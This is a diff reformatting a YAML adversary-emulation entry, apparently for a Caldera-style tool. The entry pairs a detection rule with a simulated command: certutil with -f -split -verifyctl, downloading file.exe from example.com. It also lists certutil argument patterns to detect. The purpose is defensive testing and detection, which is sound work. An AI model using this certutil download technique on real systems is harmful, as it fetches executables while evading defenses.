@@ -1,26 +1,27 @@
-id: DT0283
-name: CertUtil Download With VerifyCtl and Split Arguments
-description: Detects potential malicious use of certutil for file downloads
-tactic: defense-evasion
-technique:
-  attack_id: T1140
-  name: Deobfuscate/Decode Files or Information
-platforms:
-  windows:
-    cmd:
-      command: |
-        certutil -f -split -verifyctl http://example.com/file.exe
-      cleanup: |
-        # No cleanup needed for simulation
-      parsers:
-        plugins.stockpile.app.parsers.basic:
-          - source: host.process.id
-      requirements:
-        - privilege: user
-      detection:
-        - process_name: certutil.exe
-        - command_contains:
-            - certutil
-            - -f
-            - split
-            - VerifyCtl 
+---
+- id: DT0283
+  name: CertUtil Download With VerifyCtl and Split Arguments
+  description: Detects potential malicious use of certutil for file downloads
+  tactic: defense-evasion
+  technique:
+    attack_id: T1140
+    name: Deobfuscate/Decode Files or Information
+  platforms:
+    windows:
+      cmd:
+        command: |
+          certutil -f -split -verifyctl http://example.com/file.exe
+        cleanup: |
+          # No cleanup needed for simulation
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: host.process.id
+        requirements:
+          - privilege: user
+  detection:
+    - process_name: certutil.exe
+    - command_contains:
+        - certutil
+        - -f
+        - split
+        - VerifyCtl
